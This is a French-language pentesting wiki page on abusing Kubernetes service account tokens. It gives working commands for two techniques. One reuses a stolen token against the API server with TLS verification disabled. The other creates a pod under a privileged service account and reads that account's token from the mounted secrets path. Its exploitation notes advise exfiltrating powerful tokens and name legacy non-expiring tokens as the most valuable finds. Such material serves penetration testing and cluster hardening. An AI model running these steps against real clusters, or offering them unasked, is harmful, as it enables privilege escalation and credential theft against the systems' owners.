---
title: "Abus de jetons de compte de service : réutiliser et monter des identités puissantes"
order: 2
description: "Les jetons de compte de service sont des informations d'authentification de type porteur : quiconque en détient un est ce compte. Un attaquant réutilise des jetons trouvés dans des secrets, sur des nœuds ou dans des pods et, lorsqu'il peut créer des pods, monte un compte de service puissant dans un pod qu'il contrôle pour en hériter les permissions, transformant l'accès au jeton en action sous cette identité."
keywords:
  - service account token
  - bearer token
  - automountserviceaccounttoken
  - pod spec
  - privilege escalation
---

# Abus de jetons de compte de service

Un jeton de compte de service est une information d'authentification de type porteur : en posséder un revient à être ce compte, sans authentification supplémentaire. Deux formes d'abus en découlent. La forme directe consiste à réutiliser un jeton obtenu depuis un secret, un nœud ou un autre pod auprès du serveur d'API. La forme indirecte, disponible lorsque l'attaquant peut créer des pods, consiste à définir `serviceAccountName` sur un nouveau pod vers un compte plus privilégié, de sorte que Kubernetes monte le jeton de ce compte dans le pod de l'attaquant et que chaque appel d'API émis depuis celui-ci s'exécute sous cette identité.

## Réutiliser un jeton trouvé

```bash
# a token from a secret, node, or env var is used as-is
kubectl --token="<found-token>" --server=$APISERVER --insecure-skip-tls-verify \
  auth can-i --list
# decode first to know whose it is
echo "<found-token>" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
```

## Monter un compte puissant dans votre pod

```bash
# find a privileged service account, then run a pod as it
cat <<YAML | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata: { name: borrow, namespace: <ns-of-sa> }
spec:
  serviceAccountName: <privileged-sa>
  containers:
  - { name: c, image: alpine, command: ["sleep","1d"] }
YAML
kubectl exec -it borrow -n <ns-of-sa> -- \
  sh -c 'cat /var/run/secrets/kubernetes.io/serviceaccount/token'
# that token is the privileged SA; use it against the API
```

La création du pod ne nécessite que le droit pod-create dans l'espace de noms du compte de service, et le pod doit s'exécuter dans le même espace de noms que le compte de service cible, car un pod ne peut utiliser que des comptes de son propre espace de noms.

## Notes d'exploitation

- Les jetons sont portables : un jeton extrait d'un pod ou d'un nœud fonctionne depuis n'importe quel endroit pouvant joindre le serveur d'API, donc exfiltrer un jeton puissant suffit.
- L'astuce de montage nécessite le droit pod-create dans l'espace de noms du compte cible ; c'est pourquoi pod-create associé à un compte de service privilégié dans cet espace de noms constitue une escalade directe, distincte de la voie par le nœud décrite dans [Création de pod vers le nœud](pod-creation-to-node.md).
- Les secrets `service-account-token` hérités contiennent des jetons sans expiration et sont les trouvailles les plus précieuses ; les jetons projetés expirent et sont liés à un pod et à une audience.

## Références

- [Kubernetes : configurer les comptes de service pour les pods](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/)
- [Kubernetes : authentification par jetons](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#service-account-tokens)
- [HackTricks: Kubernetes tokens](https://book.hacktricks.xyz/pentesting-cloud/kubernetes-security)
